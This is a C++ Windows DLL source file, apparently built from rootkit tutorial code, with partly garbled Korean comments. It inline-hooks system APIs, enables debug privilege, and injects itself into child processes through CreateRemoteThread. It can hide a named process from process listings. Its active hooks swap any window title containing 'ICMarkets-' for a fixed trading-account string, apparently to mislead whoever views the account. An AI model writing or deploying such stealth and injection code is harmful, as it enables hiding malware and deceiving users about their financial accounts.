// dllmain.cpp : Defines the entry point for the DLL application.
#include "stdafx.h"
#include "windows.h"
#include "stdio.h"
#include "psapi.h"

#include <vector>
#include <fstream>
#include <ctime>
#include <chrono>


#define STR_MODULE_NAME					    "C:\\GlobalHooking.dll"
#define STR_HIDE_PROCESS_NAME			    "notepad.exe"
#define STR_LOG_FILE_PATH				    "D:\\DNG.log"
#define STATUS_SUCCESS						(0x00000000L) 

typedef LONG NTSTATUS;


using namespace std;

void send_log(const char *msg);

typedef enum _SYSTEM_INFORMATION_CLASS {
	SystemBasicInformation = 0,
	SystemPerformanceInformation = 2,
	SystemTimeOfDayInformation = 3,
	SystemProcessInformation = 5,
	SystemProcessorPerformanceInformation = 8,
	SystemInterruptInformation = 23,
	SystemExceptionInformation = 33,
	SystemRegistryQuotaInformation = 37,
	SystemLookasideInformation = 45
} SYSTEM_INFORMATION_CLASS;

typedef struct _SYSTEM_PROCESS_INFORMATION {
	ULONG NextEntryOffset;
	BYTE Reserved1[52];
	PVOID Reserved2[3];
	HANDLE UniqueProcessId;
	PVOID Reserved3;
	ULONG HandleCount;
	BYTE Reserved4[4];
	PVOID Reserved5[11];
	SIZE_T PeakPagefileUsage;
	SIZE_T PrivatePageCount;
	LARGE_INTEGER Reserved6[6];
} SYSTEM_PROCESS_INFORMATION, *PSYSTEM_PROCESS_INFORMATION;

typedef NTSTATUS(WINAPI *PFZWQUERYSYSTEMINFORMATION)(
	SYSTEM_INFORMATION_CLASS SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength);

typedef BOOL(WINAPI *PFCREATEPROCESSA)(
	LPCTSTR lpApplicationName,
	LPTSTR lpCommandLine,
	LPSECURITY_ATTRIBUTES lpProcessAttributes,
	LPSECURITY_ATTRIBUTES lpThreadAttributes,
	BOOL bInheritHandles,
	DWORD dwCreationFlags,
	LPVOID lpEnvironment,
	LPCTSTR lpCurrentDirectory,
	LPSTARTUPINFO lpStartupInfo,
	LPPROCESS_INFORMATION lpProcessInformation
	);

typedef BOOL(WINAPI *PFCREATEPROCESSW)(
	LPCTSTR lpApplicationName,
	LPTSTR lpCommandLine,
	LPSECURITY_ATTRIBUTES lpProcessAttributes,
	LPSECURITY_ATTRIBUTES lpThreadAttributes,
	BOOL bInheritHandles,
	DWORD dwCreationFlags,
	LPVOID lpEnvironment,
	LPCTSTR lpCurrentDirectory,
	LPSTARTUPINFO lpStartupInfo,
	LPPROCESS_INFORMATION lpProcessInformation
	);

typedef BOOL(WINAPI *PFSETWINDOWTEXTA)(
	HWND   hWnd,
	LPCSTR lpString
	);
typedef BOOL(WINAPI *PFSETWINDOWTEXTW)(
	HWND    hWnd,
	LPCWSTR lpString
	);

BYTE g_pOrgCPA[5] = { 0, };
BYTE g_pOrgCPW[5] = { 0, };
BYTE g_pOrgZwQSI[5] = { 0, };
BYTE g_pOrgSTA[5] = { 0, };
BYTE g_pOrgSTW[5] = { 0, };

char szCurProc[1024] = { 0, };
char *p = NULL;

BOOL hook_by_code(LPCSTR szDllName, LPCSTR szFuncName, PROC pfnNew, PBYTE pOrgBytes)
{
	FARPROC pFunc;
	DWORD dwOldProtect, dwAddress;
	BYTE pBuf[5] = { 0xE9, 0, };
	PBYTE pByte;

	// 후킹대상 API 주소를 구한다
	pFunc = (FARPROC)GetProcAddress(GetModuleHandleA(szDllName), szFuncName);
	pByte = (PBYTE)pFunc;

	// 만약 이미 후킹되어 있다면 return FALSE
	if (pByte[0] == 0xE9)
		return FALSE;

	// 5 byte 패치를 위하여 메모리에 WRITE 속성 추가
	VirtualProtect((LPVOID)pFunc, 5, PAGE_EXECUTE_READWRITE, &dwOldProtect);

	// 기존코드 (5 byte) 백업
	memcpy(pOrgBytes, pFunc, 5);

	// JMP 주소계산 (E9 XXXX)
	// => XXXX = pfnNew - pfnOrg - 5
	dwAddress = (DWORD)pfnNew - (DWORD)pFunc - 5;
	memcpy(&pBuf[1], &dwAddress, 4);

	// Hook - 5 byte 패치(JMP XXXX)
	memcpy(pFunc, pBuf, 5);

	// 메모리 속성 복귀
	VirtualProtect((LPVOID)pFunc, 5, dwOldProtect, &dwOldProtect);

	return TRUE;
}

BOOL unhook_by_code(LPCSTR szDllName, LPCSTR szFuncName, PBYTE pOrgBytes)
{
	FARPROC pFunc;
	DWORD dwOldProtect;
	PBYTE pByte;

	pFunc = (FARPROC)GetProcAddress(GetModuleHandleA(szDllName), szFuncName);
	pByte = (PBYTE)pFunc;
	if (pByte[0] != 0xE9)
		return FALSE;

	VirtualProtect((LPVOID)pFunc, 5, PAGE_EXECUTE_READWRITE, &dwOldProtect);

	memcpy(pFunc, pOrgBytes, 5);

	VirtualProtect((LPVOID)pFunc, 5, dwOldProtect, &dwOldProtect);

	return TRUE;
}

BOOL SetPrivilege(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege)
{
	TOKEN_PRIVILEGES tp;
	HANDLE hToken;
	LUID luid;

	if (!OpenProcessToken(GetCurrentProcess(),
		TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
		&hToken))
	{
		printf("OpenProcessToken error: %u\n", GetLastError());
		return FALSE;
	}

	if (!LookupPrivilegeValue(NULL,             // lookup privilege on local system
		lpszPrivilege,    // privilege to lookup 
		&luid))          // receives LUID of privilege
	{
		printf("LookupPrivilegeValue error: %u\n", GetLastError());
		return FALSE;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	if (bEnablePrivilege)
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	else
		tp.Privileges[0].Attributes = 0;

	// Enable the privilege or disable all privileges.
	if (!AdjustTokenPrivileges(hToken,
		FALSE,
		&tp,
		sizeof(TOKEN_PRIVILEGES),
		(PTOKEN_PRIVILEGES)NULL,
		(PDWORD)NULL))
	{
		printf("AdjustTokenPrivileges error: %u\n", GetLastError());
		return FALSE;
	}

	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
	{
		printf("The token does not have the specified privilege. \n");
		return FALSE;
	}

	return TRUE;
}

BOOL InjectDll2(HANDLE hProcess, LPCSTR szDllName)
{

	HANDLE hThread;
	LPVOID pRemoteBuf;
	DWORD dwBufSize = strlen(szDllName) + 1;
	FARPROC pThreadProc;
	char NAME_BUFFER[1024];
	char MSG_STR[1024];


	memset(NAME_BUFFER, 0, 1024);
	GetModuleFileNameExA(hProcess, 0, NAME_BUFFER, 1024);

	memset(MSG_STR, 0, 1024);
	sprintf_s(MSG_STR, "From %s => InjectDll2: ModuleName : %s", szCurProc, NAME_BUFFER);
	//MessageBoxA(NULL, MSG_STR, "Status", 0);
	send_log(MSG_STR);

	pRemoteBuf = VirtualAllocEx(hProcess, NULL, dwBufSize,
		MEM_COMMIT, PAGE_READWRITE);
	if (pRemoteBuf == NULL)
		return FALSE;

	WriteProcessMemory(hProcess, pRemoteBuf, (LPVOID)szDllName,
		dwBufSize, NULL);

	pThreadProc = GetProcAddress(GetModuleHandleA("kernel32.dll"),
		"LoadLibraryA");
	hThread = CreateRemoteThread(hProcess, NULL, 0,
		(LPTHREAD_START_ROUTINE)pThreadProc,
		pRemoteBuf, 0, NULL);
	WaitForSingleObject(hThread, INFINITE);

	VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);

	CloseHandle(hThread);

	return TRUE;
}

NTSTATUS WINAPI NewZwQuerySystemInformation(
	SYSTEM_INFORMATION_CLASS SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength)
{
	NTSTATUS status;
	FARPROC pFunc;
	PSYSTEM_PROCESS_INFORMATION pCur, pPrev;
	char szProcName[MAX_PATH] = { 0, };

	unhook_by_code("ntdll.dll", "ZwQuerySystemInformation", g_pOrgZwQSI);

	pFunc = GetProcAddress(GetModuleHandleA("ntdll.dll"),
		"ZwQuerySystemInformation");
	status = ((PFZWQUERYSYSTEMINFORMATION)pFunc)
		(SystemInformationClass, SystemInformation,
			SystemInformationLength, ReturnLength);

	if (status != STATUS_SUCCESS)
		goto __NTQUERYSYSTEMINFORMATION_END;

	if (SystemInformationClass == SystemProcessInformation)
	{
		pCur = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;
		pPrev = pCur;

		while (TRUE)
		{
			WideCharToMultiByte(CP_ACP, 0, (PWSTR)pCur->Reserved2[1], -1,
				szProcName, MAX_PATH, NULL, NULL);

			if (!_strcmpi(szProcName, STR_HIDE_PROCESS_NAME))
			{
				if (pCur->NextEntryOffset == 0)
					pPrev->NextEntryOffset = 0;
				else
					pPrev->NextEntryOffset += pCur->NextEntryOffset;
			}
			else
				pPrev = pCur;	// 盔窍绰 橇肺技胶甫 给 茫篮 版快父 pPrev 技泼

			if (pCur->NextEntryOffset == 0)
				break;

			pCur = (PSYSTEM_PROCESS_INFORMATION)((ULONG)pCur + pCur->NextEntryOffset);
		}
	}

__NTQUERYSYSTEMINFORMATION_END:

	hook_by_code("ntdll.dll", "ZwQuerySystemInformation",
		(PROC)NewZwQuerySystemInformation, g_pOrgZwQSI);

	return status;
}

BOOL WINAPI NewCreateProcessA(
	LPCTSTR lpApplicationName,
	LPTSTR lpCommandLine,
	LPSECURITY_ATTRIBUTES lpProcessAttributes,
	LPSECURITY_ATTRIBUTES lpThreadAttributes,
	BOOL bInheritHandles,
	DWORD dwCreationFlags,
	LPVOID lpEnvironment,
	LPCTSTR lpCurrentDirectory,
	LPSTARTUPINFO lpStartupInfo,
	LPPROCESS_INFORMATION lpProcessInformation
)
{
	BOOL bRet;
	FARPROC pFunc;
	char NAME_BUFFER[1024];

	// unhook
	unhook_by_code("kernel32.dll", "CreateProcessA", g_pOrgCPA);

	// original API 龋免
	pFunc = GetProcAddress(GetModuleHandleA("kernel32.dll"), "CreateProcessA");
	bRet = ((PFCREATEPROCESSA)pFunc)(lpApplicationName,
		lpCommandLine,
		lpProcessAttributes,
		lpThreadAttributes,
		bInheritHandles,
		dwCreationFlags,
		lpEnvironment,
		lpCurrentDirectory,
		lpStartupInfo,
		lpProcessInformation);

	// 积己等 磊侥 橇肺技胶俊 stealth2.dll 阑 牢璃记 矫糯
	if (bRet)
	{

		memset(NAME_BUFFER, 0, 1024);
		GetModuleFileNameExA(lpProcessInformation->hProcess, 0, NAME_BUFFER, 1024);

		//string module_path(NAME_BUFFER);
		//std:size_t pos = module_path.find("DNF.exe");
		//if (pos != std::string::npos)
		{
			InjectDll2(lpProcessInformation->hProcess, STR_MODULE_NAME);
		}

		//PrintLog!!!
		char MSG_STR[1024];
		memset(MSG_STR, 0, 1024);
		sprintf_s(MSG_STR, "From %s => CreateProcessA ModuleName : %s", szCurProc, NAME_BUFFER);
		send_log(MSG_STR);
	}


	// hook
	hook_by_code("kernel32.dll", "CreateProcessA",
		(PROC)NewCreateProcessA, g_pOrgCPA);

	return bRet;
}

BOOL WINAPI NewCreateProcessW(
	LPCTSTR lpApplicationName,
	LPTSTR lpCommandLine,
	LPSECURITY_ATTRIBUTES lpProcessAttributes,
	LPSECURITY_ATTRIBUTES lpThreadAttributes,
	BOOL bInheritHandles,
	DWORD dwCreationFlags,
	LPVOID lpEnvironment,
	LPCTSTR lpCurrentDirectory,
	LPSTARTUPINFO lpStartupInfo,
	LPPROCESS_INFORMATION lpProcessInformation
)
{
	BOOL bRet;
	FARPROC pFunc;
	char NAME_BUFFER[1024];

	// unhook
	unhook_by_code("kernel32.dll", "CreateProcessW", g_pOrgCPW);

	// original API 龋免
	pFunc = GetProcAddress(GetModuleHandleA("kernel32.dll"), "CreateProcessW");
	bRet = ((PFCREATEPROCESSW)pFunc)(lpApplicationName,
		lpCommandLine,
		lpProcessAttributes,
		lpThreadAttributes,
		bInheritHandles,
		dwCreationFlags,
		lpEnvironment,
		lpCurrentDirectory,
		lpStartupInfo,
		lpProcessInformation);

	// 积己等 磊侥 橇肺技胶俊 stealth2.dll 阑 牢璃记 矫糯
	if (bRet)
	{
		memset(NAME_BUFFER, 0, 1024);
		GetModuleFileNameExA(lpProcessInformation->hProcess, 0, NAME_BUFFER, 1024);

		//string module_path(NAME_BUFFER);
		//std:size_t pos = module_path.find("DNF.exe");
		//if (pos != std::string::npos)
		{
			InjectDll2(lpProcessInformation->hProcess, STR_MODULE_NAME);

			//PrintLog!!!
			char MSG_STR[1024];
			memset(MSG_STR, 0, 1024);
			sprintf_s(MSG_STR, "From %s => CreateProcessW ModuleName : %s", szCurProc, NAME_BUFFER);
			send_log(MSG_STR);
		}

	}


	// hook
	hook_by_code("kernel32.dll", "CreateProcessW",
		(PROC)NewCreateProcessW, g_pOrgCPW);

	return bRet;
}


BOOL WINAPI NewSetWindowTextA(
	HWND   hWnd,
	LPCSTR lpString
)
{
	try
	{
		BOOL bRet;
		FARPROC pFunc;
		char NAME_BUFFER[1024];

		if (lpString != NULL)
		{
			string strOrg = string(lpString);
			if (strOrg.find("ICMarkets-") != string::npos)
			{
				lpString = "1900065014: ICMarkets-Live19";
			}
		}


		// unhook
		unhook_by_code("User32.dll", "SetWindowTextA", g_pOrgSTA);

		// original API 龋免
		pFunc = GetProcAddress(GetModuleHandleA("User32.dll"), "SetWindowTextA");
		bRet = ((PFSETWINDOWTEXTA)pFunc)(hWnd, lpString);

		/*
		if (bRet)
		{
			char MSG_STR[1024];
			memset(MSG_STR, 0, 1024);
			sprintf_s(MSG_STR, "SetWindowTextA : %s, HWND : %d", lpString, hWnd);
			send_log(MSG_STR);

		}
		*/

		// hook
		hook_by_code("User32.dll", "SetWindowTextA",
			(PROC)NewSetWindowTextA, g_pOrgSTA);

		return bRet;
	}
	catch (const std::exception&)
	{
		return true;
	}
}

BOOL WINAPI NewSetWindowTextW(
	HWND    hWnd,
	LPCWSTR lpString
)
{
	try
	{
		BOOL bRet;
		FARPROC pFunc;
		char NAME_BUFFER[1024];

		if (lpString != NULL) {
			wstring strOrg = wstring(lpString);
			if (strOrg.find(TEXT("ICMarkets-")) != wstring::npos)
			{
				lpString = TEXT("1900065014: ICMarkets-Live19");
			}
		}


		// unhook
		unhook_by_code("User32.dll", "SetWindowTextW", g_pOrgSTW);

		// original API 龋免
		pFunc = GetProcAddress(GetModuleHandleA("User32.dll"), "SetWindowTextW");
		bRet = ((PFSETWINDOWTEXTW)pFunc)(hWnd, lpString);

		/*
		if (bRet)
		{
			char MSG_STR[1024];
			memset(MSG_STR, 0, 1024);
			sprintf_s(MSG_STR, "SetWindowTextW : %s, HWND : %d", lpString, hWnd);
			send_log(MSG_STR);

		}
		*/

		// hook
		hook_by_code("User32.dll", "SetWindowTextW",
			(PROC)NewSetWindowTextW, g_pOrgSTW);
		return bRet;
	}
	catch (const std::exception&)
	{
		return true;
	}
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
	memset(szCurProc, 0, 1024);
	//// HideProc2.exe 橇肺技胶俊绰 牢璃记 登瘤 臼档废 抗寇贸府
	GetModuleFileNameA(NULL, szCurProc, 1024);
	//p = strrchr(szCurProc, '\\');
	//if ((p != NULL) && !_stricmp(p + 1, "HideProc2.exe"))
	//	return TRUE;

	// change privilege
	SetPrivilege(SE_DEBUG_NAME, TRUE);


	switch (fdwReason)
	{
	case DLL_PROCESS_ATTACH:
		// hook
		//hook_by_code("kernel32.dll", "CreateProcessA",
		//	(PROC)NewCreateProcessA, g_pOrgCPA);
		//hook_by_code("kernel32.dll", "CreateProcessW",
		//	(PROC)NewCreateProcessW, g_pOrgCPW);

		hook_by_code("User32.dll", "SetWindowTextA",
			(PROC)NewSetWindowTextA, g_pOrgSTA);
		hook_by_code("User32.dll", "SetWindowTextW",
			(PROC)NewSetWindowTextW, g_pOrgSTW);

		//hook_by_code("ntdll.dll", "ZwQuerySystemInformation",
		//	(PROC)NewZwQuerySystemInformation, g_pOrgZwQSI);

		break;

	case DLL_PROCESS_DETACH:
		// unhook
		//unhook_by_code("kernel32.dll", "CreateProcessA",
		//	g_pOrgCPA);
		//unhook_by_code("kernel32.dll", "CreateProcessW",
		//	g_pOrgCPW);

		unhook_by_code("User32.dll", "SetWindowTextA",
			g_pOrgSTA);
		unhook_by_code("User32.dll", "SetWindowTextW",
			g_pOrgSTW);

		//unhook_by_code("ntdll.dll", "ZwQuerySystemInformation",
		//	g_pOrgZwQSI);
		break;
	}

	return TRUE;
}

void send_log(const char *msg)
{
	fstream log_file;
	log_file.open(STR_LOG_FILE_PATH, std::fstream::app);
	auto end = std::chrono::system_clock::now();
	std::time_t end_time = std::chrono::system_clock::to_time_t(end);
	log_file << std::ctime(&end_time) << " :: " << msg << endl;
	log_file.close();
}